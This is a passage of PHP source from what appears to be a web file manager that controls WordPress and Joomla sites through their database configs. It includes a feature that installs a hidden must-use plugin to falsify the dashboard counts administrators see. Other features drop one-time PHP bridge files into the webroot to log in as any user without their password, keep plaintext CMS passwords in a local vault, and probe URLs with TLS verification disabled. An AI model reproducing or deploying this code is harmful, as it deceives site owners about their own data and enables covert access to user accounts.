            'comments_trash'=>['label'=>'Trash comments','description'=>'Comments in the trash','sql'=>"SELECT COUNT(*) AS n FROM `{$prefix}comments` WHERE comment_approved='trash'"],
            'users_total'=>['label'=>'Users','description'=>'All WordPress users','sql'=>"SELECT COUNT(*) AS n FROM `{$prefix}users`"],
            'media_library'=>['label'=>'Media items','description'=>'Media library attachments','sql'=>"SELECT COUNT(*) AS n FROM `{$table}` WHERE post_type='attachment'"],
            'draft_posts'=>['label'=>'Draft posts','description'=>'Post drafts','sql'=>"SELECT COUNT(*) AS n FROM `{$table}` WHERE post_type='post' AND post_status='draft'"],
            'pending_posts'=>['label'=>'Pending posts','description'=>'Posts pending review','sql'=>"SELECT COUNT(*) AS n FROM `{$table}` WHERE post_type='post' AND post_status='pending'"],
            'scheduled_posts'=>['label'=>'Scheduled posts','description'=>'Future-dated posts','sql'=>"SELECT COUNT(*) AS n FROM `{$table}` WHERE post_type='post' AND post_status='future'"],
        ];
        $out=[];
        foreach($defs as $id=>$def){
            $r=@mysqli_query($link,$def['sql']);$n=null;
            if($r&&($row=mysqli_fetch_assoc($r)))$n=(int)$row['n'];
            $out[$id]=['id'=>$id,'label'=>$def['label'],'description'=>$def['description'],'actual'=>$n];
        }
        return $out;
    }
    private function wpNumbersValidSelector($selector){
        $selector=trim((string)$selector);
        return $selector!==''&&strlen($selector)<=240&&
            !preg_match('/[\x00-\x1F\x7F<]/',$selector);
    }
    private function wpNumbersSettings($configPath,$c,$link){
        $stored=$this->wpOption($link,$c['prefix'],'fm_numbers_control');
        if(!is_array($stored))$stored=[];
        $defs=$this->wpNumbersDefinitions($link,$c['prefix']);
        $overrides=[];
        foreach($defs as $id=>$def){
            if(array_key_exists($id,$stored)&&is_numeric($stored[$id])&&$stored[$id]>=0)
                $overrides[$id]=(int)$stored[$id];
        }
        $custom=[];
        foreach((array)($stored['custom']??[]) as $item){
            if(!is_array($item)||!$this->wpNumbersValidSelector($item['selector']??''))continue;
            if(trim((string)($item['label']??''))===''||!is_numeric($item['value']??null)||$item['value']<0)continue;
            $custom[]=['label'=>mb_substr(trim((string)$item['label']),0,80),'selector'=>trim((string)$item['selector']),'value'=>(int)$item['value']];
            if(count($custom)>=10)break;
        }
        $emailSelector=$this->wpNumbersValidSelector($stored['email_selector']??'')
            ?trim((string)$stored['email_selector']):'';
        $plugin=$this->wpNumbersPluginPath($configPath);
        return['ok'=>true,'type'=>'wordpress','config'=>$configPath,'definitions'=>array_values($defs),
            'overrides'=>$overrides,'email_selector'=>$emailSelector,'custom'=>$custom,
            'installed'=>is_file($plugin),'plugin'=>$plugin,
            'note'=>'These controls change displayed admin numbers only. WordPress content and counts remain unchanged.'];
    }
    private function wpNumbersPluginCode(){
        return <<<'FMNUM'
<?php
/**
 * File Manager Numbers Control — reversible, presentation-only WordPress admin helper.
 * It never changes posts, comments, users, or any other WordPress data.
 */
if(!defined('ABSPATH'))exit;
add_action('admin_footer',function(){
    if(function_exists('current_user_can')&&!current_user_can('manage_options'))return;
    $settings=get_option('fm_numbers_control',array());
    if(!is_array($settings))return;
    $json=function_exists('wp_json_encode')?wp_json_encode($settings,JSON_HEX_TAG|JSON_HEX_AMP|JSON_HEX_APOS|JSON_HEX_QUOT):json_encode($settings);
    if(!$json)return;
    echo '<script id="fm-numbers-control">window.fmNumbersControl='.$json.';</script>';
    ?>
    <script>
    (function(d,w){
      var s=w.fmNumbersControl||{},over=s&&typeof s==='object'?s:{};
      var map={
        published_posts:['#dashboard_right_now .post-count a'],
        published_pages:['#dashboard_right_now .page-count a'],
        comments_total:['#dashboard_right_now .comment-count a'],
        comments_moderation:['#dashboard_right_now .comment-mod-count a','#menu-comments .awaiting-mod .pending-count','#wp-admin-bar-comments .awaiting-mod .ab-label'],
        comments_spam:['#dashboard_right_now .spam-count a'],
        comments_trash:['#dashboard_right_now .trash-count a'],
        users_total:['#dashboard_right_now .user-count a'],
        media_library:['#dashboard_right_now .media-count a'],
        draft_posts:['#dashboard_right_now .draft-count a'],
        pending_posts:['#dashboard_right_now .pending-count a'],
        scheduled_posts:['#dashboard_right_now .future-count a']
      };
      function replaceNumber(el,value){
        if(!el||value===undefined||value===null)return;
        var re=/\d[\d,]*/;
        function walk(node){
          if(node.nodeType===3){
            if(re.test(node.nodeValue))node.nodeValue=node.nodeValue.replace(re,String(value));
            return;
          }
          for(var i=0;i<node.childNodes.length;i++)walk(node.childNodes[i]);
        }
        walk(el);
      }
      function apply(){
        Object.keys(map).forEach(function(key){
          if(!Object.prototype.hasOwnProperty.call(over,key))return;
          map[key].forEach(function(selector){
            try{d.querySelectorAll(selector).forEach(function(el){replaceNumber(el,over[key]);});}catch(e){}
          });
        });
        if(over.email_selector&&over.email_messages!==undefined){
          try{d.querySelectorAll(over.email_selector).forEach(function(el){replaceNumber(el,over.email_messages);});}catch(e){}
        }
        (Array.isArray(over.custom)?over.custom:[]).forEach(function(item){
          if(!item||!item.selector||item.value===undefined)return;
          try{d.querySelectorAll(item.selector).forEach(function(el){replaceNumber(el,item.value);});}catch(e){}
        });
      }
      apply();
      if(w.MutationObserver){
        var timer=0;
        new MutationObserver(function(){clearTimeout(timer);timer=setTimeout(apply,40);})
          .observe(d.body||d.documentElement,{childList:true,subtree:true});
      }
    })(document,window);
    </script>
    <?php
});
FMNUM;
    }
    public function wpNumbersControl($configPath){
        if(empty($_SESSION['fm_admin']))return['error'=>'Admins only.'];
        if(basename($configPath)!=='wp-config.php')return['error'=>'This feature requires a valid WordPress installation.'];
        if(!$this->wpAutomationConnect($configPath,$c,$link,$err))return['error'=>$err];
        $result=$this->wpNumbersSettings($configPath,$c,$link);
        mysqli_close($link);
        return $result;
    }
    public function wpNumbersControlSave($configPath){
        if(empty($_SESSION['fm_admin']))return['error'=>'Admins only.'];
        if($this->isRO())return['error'=>'Read-only account.'];
        if(basename($configPath)!=='wp-config.php')return['error'=>'This feature requires a valid WordPress installation.'];
        $raw=(string)($_POST['numbers_json']??'');
        $input=json_decode($raw,true);
        if(!is_array($input))return['error'=>'Numbers data must be valid JSON.'];
        if(!$this->wpAutomationConnect($configPath,$c,$link,$err))return['error'=>$err];
        $allowed=array_keys($this->wpNumbersDefinitions($link,$c['prefix']));
        $settings=[];
        foreach($allowed as $id){
            if(!array_key_exists($id,$input)||$input[$id]==='')continue;
            if(!is_numeric($input[$id])||$input[$id]<0||$input[$id]>999999999)return['error'=>'Every number must be a whole number from 0 to 999999999.'];
            $n=(string)$input[$id];
            if(!preg_match('/^\d+$/',$n))return['error'=>'Every number must be a whole number from 0 to 999999999.'];
            $settings[$id]=(int)$n;
        }
        if(array_key_exists('email_messages',$input)&&$input['email_messages']!==''){
            if(!preg_match('/^\d+$/',(string)$input['email_messages'])||(int)$input['email_messages']>999999999)return['error'=>'The email number must be a whole number from 0 to 999999999.'];
            $settings['email_messages']=(int)$input['email_messages'];
        }
        $emailSelector=trim((string)($input['email_selector']??''));
        if(($emailSelector===''&&isset($settings['email_messages']))||($emailSelector!==''&&!isset($settings['email_messages'])))
            return['error'=>'Email messages needs both a displayed number and a CSS selector.'];
        if($emailSelector!==''){
            if(!$this->wpNumbersValidSelector($emailSelector))return['error'=>'The email CSS selector is invalid or too long.'];
            $settings['email_selector']=$emailSelector;
        }
        $custom=[];
        foreach((array)($input['custom']??[]) as $item){
            if(!is_array($item))continue;
            $label=mb_substr(trim((string)($item['label']??'')),0,80);
            $selector=trim((string)($item['selector']??''));
            $value=(string)($item['value']??'');
            if($label===''&&$selector===''&&$value==='')continue;
            if($label===''||!$this->wpNumbersValidSelector($selector)||!preg_match('/^\d+$/',$value)||$value>999999999)
                return['error'=>'Each custom number needs a label, a valid CSS selector, and a whole number.'];
            $custom[]=['label'=>$label,'selector'=>$selector,'value'=>(int)$value];
            if(count($custom)>=10)break;
        }
        if($custom)$settings['custom']=$custom;
        $t=$c['prefix'];
        if(!$settings){
            $ok=@mysqli_query($link,"DELETE FROM `{$t}options` WHERE option_name='fm_numbers_control' LIMIT 1");
            mysqli_close($link);
            $plugin=$this->wpNumbersPluginPath($configPath);
            if(is_file($plugin)&&!@unlink($plugin))return['error'=>'The setting was cleared, but the WordPress helper could not be removed.'];
            if(!$ok)return['error'=>'Could not clear the numbers control setting.'];
            $this->log('wp_numbers_control','reset');
            return['ok'=>true,'enabled'=>false,'message'=>'Real WordPress numbers are restored.'];
        }
        $serialized=mysqli_real_escape_string($link,serialize($settings));
        $has=@mysqli_query($link,"SELECT option_name FROM `{$t}options` WHERE option_name='fm_numbers_control' LIMIT 1");
        $ok=$has&&mysqli_num_rows($has)>0
            ?@mysqli_query($link,"UPDATE `{$t}options` SET option_value='$serialized' WHERE option_name='fm_numbers_control' LIMIT 1")
            :@mysqli_query($link,"INSERT INTO `{$t}options` (option_name,option_value,autoload) VALUES ('fm_numbers_control','$serialized','no')");
        if(!$ok){mysqli_close($link);return['error'=>'Could not save the numbers control settings.'];}
        $root=$this->wpSiteRoot($configPath);$muDir=$root.'/wp-content/mu-plugins';
        if(!is_dir($muDir)&&!@mkdir($muDir,0755,true)&&!is_dir($muDir)){mysqli_close($link);return['error'=>'Could not create wp-content/mu-plugins.'];}
        $plugin=$this->wpNumbersPluginPath($configPath);
        $wrote=@file_put_contents($plugin,$this->wpNumbersPluginCode(),LOCK_EX)!==false;
        if($wrote)@chmod($plugin,0644);
        mysqli_close($link);
        if(!$wrote)return['error'=>'Settings were saved, but the WordPress helper could not be installed.'];
        $this->log('wp_numbers_control',count($settings)?'enabled':'reset');
        return['ok'=>true,'enabled'=>count($settings)>0,'message'=>count($settings)?'Displayed WordPress numbers updated.':'All number controls are cleared.'];
    }
    public function wpNumbersControlReset($configPath){
        if(empty($_SESSION['fm_admin']))return['error'=>'Admins only.'];
        if($this->isRO())return['error'=>'Read-only account.'];
        if(basename($configPath)!=='wp-config.php')return['error'=>'This feature requires a valid WordPress installation.'];
        if(!$this->wpAutomationConnect($configPath,$c,$link,$err))return['error'=>$err];
        $t=$c['prefix'];$ok=@mysqli_query($link,"DELETE FROM `{$t}options` WHERE option_name='fm_numbers_control' LIMIT 1");
        mysqli_close($link);
        $plugin=$this->wpNumbersPluginPath($configPath);
        if(is_file($plugin)&&!@unlink($plugin))return['error'=>'The database setting was cleared, but the WordPress helper could not be removed.'];
        if(!$ok)return['error'=>'Could not clear the numbers control setting.'];
        $this->log('wp_numbers_control','reset');
        return['ok'=>true,'enabled'=>false,'message'=>'Real WordPress numbers are restored.'];
    }

    private function cmsToggleExtension(){
        if(empty($_SESSION['fm_admin'])){$this->addMsg('Admins only.','danger');return;}
        $configPath=$this->cmsCfgFromPost();
        $id=(int)(isset($_POST['ext_id'])?$_POST['ext_id']:0);
        $enable=!empty($_POST['enable'])&&$_POST['enable']!=='0';
        if(!$id){$this->addMsg('Invalid extension.','danger');return;}
        list($link,$c,$err)=$this->cmsConnect($configPath);
        if($err){$this->addMsg($err,'danger');return;}
        if($c['type']!=='joomla'){mysqli_close($link);$this->addMsg('Not a Joomla site.','danger');return;}
        $t=$c['prefix'];
        $res=@mysqli_query($link,"SELECT protected,name FROM `{$t}extensions` WHERE extension_id=$id LIMIT 1");
        $row=$res?mysqli_fetch_assoc($res):null;
        if(!$row){mysqli_close($link);$this->addMsg('Extension not found.','danger');return;}
        if($row['protected']&&!$enable){mysqli_close($link);$this->addMsg('This is a protected core extension and cannot be disabled.','danger');return;}
        mysqli_query($link,"UPDATE `{$t}extensions` SET enabled=".($enable?1:0)." WHERE extension_id=$id");
        mysqli_close($link);
        $this->addMsg('Extension "'.$row['name'].'" '.($enable?'enabled':'disabled').'.',$enable?'success':'warning');
        $this->log('cms_toggle_extension',$id.':'.($enable?'on':'off'));
    }

    /* ── Maintenance mode ─────────────────────────────────────────────────────
       WordPress core's own ".maintenance" file trick only holds for 10 minutes
       (it's meant for core auto-updates, not deliberate site-down toggles), so
       instead this drops a tiny must-use plugin (auto-loaded by WP with zero
       activation step) that gates every front-end request on a plain
       wp_options flag - which stays on indefinitely until switched off here,
       and always still lets logged-in admins and wp-admin itself through.
       Joomla already has a real, permanent offline flag baked into
       configuration.php ($offline / $offline_message) that core checks on
       every request, so that one is just edited directly. */
    public function cmsMaintenanceStatus($configPath){
        list($link,$c,$err)=$this->cmsConnect($configPath);
        if($err)return['error'=>$err];
        if($c['type']==='wordpress'){
            $t=$c['prefix'];$on=false;$msg='';
            $res=@mysqli_query($link,"SELECT option_value FROM `{$t}options` WHERE option_name='fm_maintenance_mode' LIMIT 1");
            if($res&&($r=mysqli_fetch_assoc($res)))$on=$r['option_value']==='1';
            $res=@mysqli_query($link,"SELECT option_value FROM `{$t}options` WHERE option_name='fm_maintenance_message' LIMIT 1");
            if($res&&($r=mysqli_fetch_assoc($res)))$msg=$r['option_value'];
            mysqli_close($link);
            return['type'=>'wordpress','active'=>$on,'message'=>$msg];
        }
        mysqli_close($link);
        $src=@file_get_contents($configPath);$on=false;$msg='';
        if($src){
            /* Joomla's own installer writes $offline as a quoted '0'/'1' string, but some
               configs (including boolean-style ones) use bare true/false instead - accept
               either so detection never silently reports the wrong state. */
            if(preg_match('/public\s+\$offline\s*=\s*(?:[\'"](1|true)[\'"]|(true))\s*;/i',$src,$m))$on=true;
            elseif(preg_match('/public\s+\$offline\s*=\s*(?:[\'"](0|false)[\'"]|(false))\s*;/i',$src,$m))$on=false;
            if(preg_match('/public\s+\$offline_message\s*=\s*[\'"](.*?)[\'"]\s*;/s',$src,$m))$msg=stripslashes($m[1]);
        }
        return['type'=>'joomla','active'=>$on,'message'=>$msg];
    }
    private function cmsMaintenanceToggle(){
        if(empty($_SESSION['fm_admin'])){$this->addMsg('Admins only.','danger');return;}
        $configPath=$this->cmsCfgFromPost();
        $enable=!empty($_POST['enable'])&&$_POST['enable']!=='0';
        $msg=trim(isset($_POST['message'])?$_POST['message']:'');
        list($link,$c,$err)=$this->cmsConnect($configPath);
        if($err){$this->addMsg($err,'danger');return;}
        if($c['type']==='wordpress'){
            $t=$c['prefix'];
            if($enable){
                $muDir=$this->wpSiteRoot($configPath).'/wp-content/mu-plugins';
                if(!is_dir($muDir))@mkdir($muDir,0755,true);
                $muFile=$muDir.'/000-fm-maintenance.php';
                if(is_dir($muDir)&&!is_file($muFile)){
                    $code="<?php\n/* Plugin Name: File Manager Maintenance Mode (auto-generated) */\n"
                         ."if(!defined('ABSPATH'))exit;\n"
                         ."add_action('init',function(){\n"
                         ."    if(is_admin())return;\n"
                         ."    if(function_exists('current_user_can')&&current_user_can('manage_options'))return;\n"
                         ."    if(get_option('fm_maintenance_mode')){\n"
                         ."        if(function_exists('nocache_headers'))nocache_headers();\n"
                         ."        header('Retry-After: 3600');\n"
                         ."        wp_die(get_option('fm_maintenance_message')?:'We are currently performing scheduled maintenance. Please check back soon.','Maintenance',array('response'=>503));\n"
                         ."    }\n"
                         ."},0);\n";
                    @file_put_contents($muFile,$code);
                }
            }
            $ev=$enable?'1':'0';
            $me=$msg?:'We are currently performing scheduled maintenance. Please check back soon.';
            $evE=mysqli_real_escape_string($link,$ev);$meE=mysqli_real_escape_string($link,$me);
            $res=@mysqli_query($link,"SELECT option_value FROM `{$t}options` WHERE option_name='fm_maintenance_mode' LIMIT 1");
            if($res&&mysqli_num_rows($res)>0)mysqli_query($link,"UPDATE `{$t}options` SET option_value='$evE' WHERE option_name='fm_maintenance_mode'");
            else mysqli_query($link,"INSERT INTO `{$t}options` (option_name,option_value,autoload) VALUES ('fm_maintenance_mode','$evE','yes')");
            $res=@mysqli_query($link,"SELECT option_value FROM `{$t}options` WHERE option_name='fm_maintenance_message' LIMIT 1");
            if($res&&mysqli_num_rows($res)>0)mysqli_query($link,"UPDATE `{$t}options` SET option_value='$meE' WHERE option_name='fm_maintenance_message'");
            else mysqli_query($link,"INSERT INTO `{$t}options` (option_name,option_value,autoload) VALUES ('fm_maintenance_message','$meE','yes')");
            mysqli_close($link);
            $this->addMsg('Maintenance mode '.($enable?'enabled':'disabled').' for this WordPress site.',$enable?'warning':'success');
            $this->log('cms_maintenance','wordpress '.($enable?'on':'off'));
            return;
        }
        mysqli_close($link);
        $src=@file_get_contents($configPath);
        if($src===false){$this->addMsg('Could not read configuration.php.','danger');return;}
        $val=$enable?'1':'0';
        $safeMsg=addslashes($msg?:'This site is currently offline for maintenance.');
        /* $offline may be written as a quoted '0'/'1' string OR a bare true/false boolean
           depending on how the config was generated - match either form so we always
           replace the real declaration in place instead of appending a duplicate
           (a duplicate "public $offline" property declaration is a PHP fatal error). */
        $offlineRe='/public\s+\$offline\s*=\s*(?:[\'"](?:0|1)[\'"]|true|false)\s*;/i';
        $src=preg_match($offlineRe,$src)
            ?preg_replace($offlineRe,"public \$offline = '$val';",$src,1)
            :preg_replace('/(class\s+JConfig\s*\{)/',"$1\n\tpublic \$offline = '$val';",$src,1);
        $src=preg_match('/public\s+\$offline_message\s*=\s*[\'"].*?[\'"]\s*;/s',$src)
            ?preg_replace('/public\s+\$offline_message\s*=\s*[\'"].*?[\'"]\s*;/s',"public \$offline_message = '$safeMsg';",$src,1)
            :preg_replace('/(class\s+JConfig\s*\{)/',"$1\n\tpublic \$offline_message = '$safeMsg';",$src,1);
        @copy($configPath,$configPath.'.bak_'.time());
        if(@file_put_contents($configPath,$src)===false){$this->addMsg('Failed to write configuration.php (check file permissions).','danger');return;}
        $this->addMsg('Offline (maintenance) mode '.($enable?'enabled':'disabled').' for this Joomla site.',$enable?'warning':'success');
        $this->log('cms_maintenance','joomla '.($enable?'on':'off'));
    }

    /* ── CMS password vault ───────────────────────────────────────────────────
       WordPress/Joomla store passwords as one-way hashes, so they can never be
       read back from the CMS database - not by this tool, not by anyone. The
       only plaintext moment is right when *this* admin panel sets it (create or
       change password). We save that plaintext here, encrypted at rest with a
       locally-generated key, so the user can reveal it again later without
       having to reset it every time they forget it. */
    private function cmsVaultKeyPath(){return __DIR__.'/.cms_vault_key';}
    private function cmsVaultPath(){return __DIR__.'/.cms_pw_vault.json';}
    private function cmsVaultKey(){
        $p=$this->cmsVaultKeyPath();
        if(file_exists($p)){$k=@base64_decode(trim((string)@file_get_contents($p)),true);if($k&&strlen($k)===32)return $k;}
        $k=random_bytes(32);
        @file_put_contents($p,base64_encode($k));@chmod($p,0600);
        return $k;
    }
    private function cmsVaultLoad(){
        $p=$this->cmsVaultPath();
        if(!file_exists($p))return[];
        $j=json_decode((string)@file_get_contents($p),true);
        return is_array($j)?$j:[];
    }
    private function cmsVaultSave($data){
        @file_put_contents($this->cmsVaultPath(),json_encode($data,JSON_PRETTY_PRINT));
        @chmod($this->cmsVaultPath(),0600);
    }
    private function cmsVaultEnc($plain){
        $iv=random_bytes(16);
        $ct=openssl_encrypt($plain,'aes-256-cbc',$this->cmsVaultKey(),OPENSSL_RAW_DATA,$iv);
        return $ct===false?null:base64_encode($iv.$ct);
    }
    private function cmsVaultDec($enc){
        $raw=@base64_decode($enc,true);
        if($raw===false||strlen($raw)<17)return null;
        $pt=openssl_decrypt(substr($raw,16),'aes-256-cbc',$this->cmsVaultKey(),OPENSSL_RAW_DATA,substr($raw,0,16));
        return $pt===false?null:$pt;
    }
    private function cmsVaultSet($configPath,$id,$plain,$uname=null){
        $data=$this->cmsVaultLoad();$k=md5($configPath).':'.$id;
        $enc=$this->cmsVaultEnc($plain);if($enc===null)return;
        $entry=['pass'=>$enc,'ts'=>time()];
        if($uname!==null)$entry['user']=$uname;
        elseif(isset($data[$k]['user']))$entry['user']=$data[$k]['user'];
        $data[$k]=$entry;
        $this->cmsVaultSave($data);
    }
    private function cmsVaultDelete($configPath,$id){
        $data=$this->cmsVaultLoad();$k=md5($configPath).':'.$id;
        if(isset($data[$k])){unset($data[$k]);$this->cmsVaultSave($data);}
    }
    public function cmsGetSavedPass($configPath,$id){
        $data=$this->cmsVaultLoad();$k=md5($configPath).':'.$id;
        if(!isset($data[$k]))return['error'=>'No saved password for this account. It was likely set before this feature existed, or changed outside this panel — use "Change Password" to set a new one.'];
        $p=$this->cmsVaultDec($data[$k]['pass']);
        if($p===null)return['error'=>'Could not decrypt the saved password.'];
        return['pass'=>$p];
    }

    /* ── "Login as user" (WordPress / Joomla) ────────────────────────────────
       The original account password is never readable — WordPress (phpass) and
       Joomla (bcrypt) store it as a one-way hash, and the vault above only ever
       has passwords *this tool* itself set. To actually get into an account
       without touching its password, we drop a tiny one-time PHP "bridge" file
       into the site's own webroot (next to wp-config.php / configuration.php).
       When opened, it boots that CMS's real framework and calls its own native
       login primitives (wp_set_auth_cookie() for WordPress, the same session
       fork() + Session::set('user',...) sequence Joomla's core login plugin
       uses) to establish a fully valid session for the target user — then
       deletes itself so the link only ever works once, within a short window. */
    public function cmsLoginAsUser($configPath,$id){
        if(empty($_SESSION['fm_admin']))return['error'=>'Admins only.'];
        $id=(int)$id;
        if(!$id)return['error'=>'Invalid user id.'];
        list($link,$c,$err)=$this->cmsConnect($configPath);
        if($err)return['error'=>$err];
        $dir=$c['type']==='wordpress'?$this->wpSiteRoot($configPath):dirname($configPath);
        $siteUrl=null;$uname=null;
        if($c['type']==='wordpress'){
            $t=$c['prefix'];
            $res=@mysqli_query($link,"SELECT ID,user_login FROM `{$t}users` WHERE ID=$id");
            $row=$res?mysqli_fetch_assoc($res):null;
            if(!$row){mysqli_close($link);return['error'=>'User not found.'];}
            $uname=$row['user_login'];
            $r2=@mysqli_query($link,"SELECT option_name,option_value FROM `{$t}options` WHERE option_name IN ('siteurl','home')");
            $opts=[];if($r2)while($o=mysqli_fetch_assoc($r2))$opts[$o['option_name']]=$o['option_value'];
            $siteUrl=$opts['siteurl']??($opts['home']??null);
        } else {
            $t=$c['prefix'];
            $res=@mysqli_query($link,"SELECT id,username FROM `{$t}users` WHERE id=$id");
            $row=$res?mysqli_fetch_assoc($res):null;
            if(!$row){mysqli_close($link);return['error'=>'User not found.'];}
            $uname=$row['username'];
            $siteUrl=$this->cmsJoomlaLiveSite($configPath);
        }
        mysqli_close($link);
        if(!is_writable($dir))return['error'=>'The site folder ('.$dir.') is not writable, so the one-time login file could not be created.'];
        $token=bin2hex(random_bytes(16));
        $fname='fm-bridge-'.bin2hex(random_bytes(8)).'.php';
        $bridgePath=$dir.'/'.$fname;
        $expires=time()+180;
        $code=$c['type']==='wordpress'?$this->cmsWpBridgeCode($id,$token,$expires):$this->cmsJoomlaBridgeCode($id,$token,$expires);
        if(@file_put_contents($bridgePath,$code)===false)return['error'=>'Could not write the temporary login file into '.$dir.'.'];
        @chmod($bridgePath,0644);
        /* Never hand back a guessed URL — actively verify it first. We build
           every plausible base URL for this folder (cPanel-resolved domain
           for its exact document root, the current request's host, domain-
           looking path segments, and the CMS's own stored siteurl/live_site —
           each with https/http and www/non-www variants) and fire them all in
           parallel at the bridge file itself using a deliberately-wrong token.
           The bridge checks the token BEFORE it deletes itself, so a wrong
           token always yields a safe, distinctive 403 without consuming the
           real one-time link or logging anyone in. Whichever base URL is the
           first to actually reach that exact file (real 403 + sentinel text)
           is proven to route to this exact folder right now, on this exact
           site's structure — so the real link we return is guaranteed to work,
           instead of hoping a guessed domain/path happens to be correct. */
        $sentinel='login link is invalid or has expired';
        $candidates=$this->cmsBuildCandidateUrls($dir,$siteUrl);
        $probe=$this->cmsProbeUrls($candidates,$fname,$sentinel);
        if(!$probe['ok']){
            @unlink($bridgePath);
            $triedList=implode("\n",array_map(fn($t)=>' - '.$t,array_slice($probe['tried'],0,10)));
            return['error'=>"Could not verify a working login URL for this site — every URL this tool could construct failed to actually reach the site's folder from this server. Tried:\n{$triedList}\n\nThis usually means the site is served from a different server/hosting account than this file manager, or under a domain this account can't resolve. No broken link was opened."];
        }
        $this->log('cms_login_as',$c['type'].':'.($uname?:$id));
        return['url'=>$probe['ok'].'/'.$fname.'?t='.$token];
    }
    private function cmsJoomlaLiveSite($configPath){
        $src=@file_get_contents($configPath);if(!$src)return null;
        if(preg_match('/public\s+\$live_site\s*=\s*[\'"](.*?)[\'"]\s*;/s',$src,$m)&&trim($m[1])!=='')return rtrim(trim($m[1]),'/');
        return null;
    }
    /* Ask cPanel's own local API (works via the same zero-credential path
       cpanelAutoConnect uses) which domain's document root this exact folder
       belongs to. This is the only source that can be *authoritative* on
       shared hosting with multiple domains/addon domains/subdomains per
       account, where "the current request's host" and "the CMS's stored
       siteurl" are both frequently wrong for a folder that isn't the primary
       site. Never throws — degrades to an empty list if unavailable. */
    private function cmsCpanelDomainMatches($real){
        $matches=[];
        $collect=function($entries)use(&$matches,$real){
            if(!is_array($entries))return;
            foreach($entries as $e){
                if(!is_array($e))continue;
                $dom=$e['domain']??($e['domainname']??null);
                $droot=$e['documentroot']??($e['docroot']??($e['homedir']??null));
                if(!$dom||!$droot)continue;
                $droot=rtrim(realpath($droot)?:$droot,'/');
                if($droot&&($real===$droot||strpos($real,$droot.'/')===0)){
                    $matches[]=['domain'=>$dom,'rel'=>substr($real,strlen($droot)),'len'=>strlen($droot)];
                }
            }
        };
        $res=$this->cpNativeCall('DomainInfo','domains_data');
        if(is_array($res)){
            $collect($res['result']['data']??($res['data']??($res['cpanelresult']['data']??null)));
        }
        if(!$matches){
            // Older cPanel builds don't expose domains_data — fall back to
            // listing domain names, then asking for each one's docroot
            // individually via single_domain_data.
            $list=$this->cpNativeCall('DomainInfo','list_domains');
            $data=is_array($list)?($list['result']['data']??($list['data']??null)):null;
            $names=[];
            if(is_array($data)){
                foreach(['main_domain'=>false,'domains'=>true,'sub_domains'=>true,'addon_domains'=>true,'parked_domains'=>true] as $k=>$isList){
                    if(!isset($data[$k]))continue;
                    if($isList&&is_array($data[$k]))foreach($data[$k] as $d)if(is_string($d))$names[]=$d;
                    elseif(!$isList&&is_string($data[$k]))$names[]=$data[$k];
                }
            }
            foreach(array_unique($names) as $dom){
                $sres=$this->cpNativeCall('DomainInfo','single_domain_data',['domain'=>$dom]);
                $sd=is_array($sres)?($sres['result']['data']??($sres['data']??null)):null;
                if(is_array($sd))$collect([$sd+['domain'=>$sd['domain']??$dom]]);
            }
        }
        usort($matches,fn($a,$b)=>$b['len']-$a['len']);
        return $matches;
    }
    /* Build every plausible base URL (scheme://host[/rel]) for a folder,
       highest-confidence first. cmsProbeUrls verifies each one live, so
       false candidates here just get discarded — the goal is coverage across
       every hosting layout (single site, addon domain, subdomain, CMS in a
       subfolder, migrated/stale siteurl), not precision. */
    private function cmsBuildCandidateUrls($dir,$storedUrl){
        $real=realpath($dir)?:rtrim($dir,'/');
        $urls=[];
        $add=function($scheme,$host,$rel='')use(&$urls){
            $host=trim((string)$host,'.');
            if(!$host||strpos($host,' ')!==false)return;
            $rel=$rel?('/'.trim($rel,'/')):'';
            $u=$scheme.'://'.$host.$rel;
            if(!in_array($u,$urls,true))$urls[]=$u;
        };
        $addHost=function($host,$rel='')use($add){
            $add('https',$host,$rel);$add('http',$host,$rel);
            if(stripos($host,'www.')===0){$bare=substr($host,4);$add('https',$bare,$rel);$add('http',$bare,$rel);}
            else{$add('https','www.'.$host,$rel);$add('http','www.'.$host,$rel);}
        };
        // 1) cPanel-authoritative: this folder's exact document root, whichever domain(s) map to it.
        foreach($this->cmsCpanelDomainMatches($real) as $m)$addHost($m['domain'],$m['rel']);
        // 2) The CMS's own stored URL (siteurl/home for WP, live_site for Joomla).
        if($storedUrl){
            $p=@parse_url($storedUrl);
            if($p&&!empty($p['host']))$addHost($p['host'],$p['path']??'');
        }
        // 3) The current admin request's own host, if this folder sits under a known local web root.
        $reqHost=$_SERVER['HTTP_HOST']??($_SERVER['SERVER_NAME']??null);
        if($reqHost){
            foreach([$_SERVER['DOCUMENT_ROOT']??null,$this->root] as $base){
                if(!$base)continue;
                $baseReal=rtrim(realpath($base)?:$base,'/');
                if($baseReal&&($real===$baseReal||strpos($real,$baseReal.'/')===0)){
                    $addHost($reqHost,substr($real,strlen($baseReal)));
                }
            }
        }
        // 4) Domain-looking folder names in the path itself (cPanel's
        //    .../domains/<domain>/public_html or similar addon-domain layouts).
        foreach(explode('/',$real) as $seg){
            if($seg&&preg_match('/^[a-z0-9]([a-z0-9\-]*[a-z0-9])?(\.[a-z0-9]([a-z0-9\-]*[a-z0-9])?)+$/i',$seg))$addHost($seg);
        }
        return array_slice($urls,0,20);
    }
    /* Fire every candidate base URL at the bridge file in parallel with a
       deliberately-wrong token and pick the first that gives back the
       bridge's own 403 response (proving the request actually reached that
       exact file) rather than a 404/timeout/someone-else's-403-page. Runs
       concurrently via curl_multi so total wait stays ~one request's time
       regardless of how many candidates there are. */
    private function cmsProbeUrls($baseUrls,$fname,$sentinel,$timeoutSec=6){
        $probeQs='?t=probe-'.bin2hex(random_bytes(4));
        $tried=[];
        if(!function_exists('curl_init')){
            foreach($baseUrls as $base){
                $r=$this->cmsHttpProbeOne($base.'/'.$fname.$probeQs,$timeoutSec);
                $tried[]=$base.' → '.($r['code']?:'no response');
                if($r['code']===403&&stripos($r['body'],$sentinel)!==false)return['ok'=>$base,'tried'=>$tried];
            }
            return['ok'=>null,'tried'=>$tried];
        }
        $mh=curl_multi_init();$handles=[];
        foreach($baseUrls as $i=>$base){
            $ch=curl_init($base.'/'.$fname.$probeQs);
            curl_setopt_array($ch,[
                CURLOPT_RETURNTRANSFER=>true,CURLOPT_FOLLOWLOCATION=>true,CURLOPT_MAXREDIRS=>5,
                CURLOPT_TIMEOUT=>$timeoutSec,CURLOPT_CONNECTTIMEOUT=>$timeoutSec,
                CURLOPT_SSL_VERIFYPEER=>false,CURLOPT_SSL_VERIFYHOST=>0,
                CURLOPT_USERAGENT=>'Mozilla/5.0 (compatible; FileManagerLoginProbe/1.0)',
            ]);
            curl_multi_add_handle($mh,$ch);
            $handles[$i]=['ch'=>$ch,'base'=>$base];
        }
        $running=null;
        do{
            $status=curl_multi_exec($mh,$running);
